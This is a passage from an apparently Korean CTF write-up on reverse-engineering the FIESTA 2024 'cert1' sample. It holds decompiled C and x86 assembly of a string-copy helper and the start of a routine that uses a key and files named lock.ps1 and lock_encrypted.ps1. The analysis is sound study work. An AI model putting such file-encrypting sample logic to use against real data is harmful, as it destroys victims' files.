    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7FFFFFFF&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7FFFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2147483613&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_6:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;operator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_invalid_parameter_noinfo_noreturn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFFE0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_4011D0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;operator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_15:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;code branch를 다 볼 필요는 없고&lt;/p&gt;

&lt;p&gt;0글자~0xF글자&lt;/p&gt;

&lt;p&gt;0x10글자~0x1F글자&lt;/p&gt;

&lt;p&gt;이쪽만 보면 될 것&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사유&lt;/p&gt;

&lt;p&gt;어차피 Size에 8 아니면 0x12만 들어갈텐데 뭐&lt;/p&gt;

&lt;p&gt;모르겠으면 저 코드 끝나고 리턴하는 부분에서 얼마씩이 *return_value에 담겨오는지 bp 걸고 보면 되겠지….&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;저 코드의 return은 신경 안 써도 된다고 생각함.&lt;/p&gt;

&lt;p&gt;왜냐.&lt;/p&gt;

&lt;p&gt;caller는 저 함수를 콜해놓고 *ax를 참조하지 않음&lt;/p&gt;

&lt;p&gt;실제로 어셈으로 확인하면&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2033.png&quot; alt=&quot;image.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2034.png&quot; alt=&quot;image.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;*ax에 뭘 넣는 것도 없고, retn 8로 지역변수를 선언하느라 올렸던 스택프레임만 원상복구하는 모습을 볼 수 있음&lt;/p&gt;

&lt;p&gt;아무튼 뭘 하든 결국 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memmove&lt;/code&gt;를 하게 됨&lt;/p&gt;

&lt;p&gt;따라서 핵심 함수가 아님&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 main 함수의 다음 부분을 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;sub_405220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;specialllll!!!!!!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x12u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_401E80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;33-sub_401e80-분석&quot;&gt;3.3. sub_401E80 분석&lt;/h2&gt;

&lt;p&gt;저건 sub_401E80(“specialllll!!!!!!!”) 로 해석해도 무방할 듯 하다.&lt;/p&gt;

&lt;p&gt;다만 main에서 보이는 sub_401E80의 인자 수와  sub_401E80 내부에서 보이는 인자 수가 달라 교차 검증을 진행했다.&lt;/p&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; main에서 sub_401E80을 콜하기 전까지의 행위&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;memmove_sub_405220&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;; Size=8 || 18&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Bl&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;;   } // starts at 4023E7&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;;   try {&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var_4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var_28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;str__lock_ps1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;sub_401E80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;eax는 확실히 인자로 가는 것 같고,&lt;/p&gt;

&lt;p&gt;이상한 건 edx, ecx&lt;/p&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; sub_401E80에서 edx, ecx에 최초로 접근하는 시점&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0B8h&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;; Size&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var_184&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;; Val&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;; void *&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;_memset&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0Ch&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;14h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0Fh&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;jbe&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;loc_401ED0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;내부에서 쓰는 게 맞다.&lt;/p&gt;

&lt;p&gt;그럼 main에서 sub_401E80를 고쳐주자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2035.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아주 좋아&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__usercall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_401E80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str__lock_encrypted_ps1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str__lock_ps1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ecx&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_1_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edi&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edx&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ebx&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edi&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ecx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;
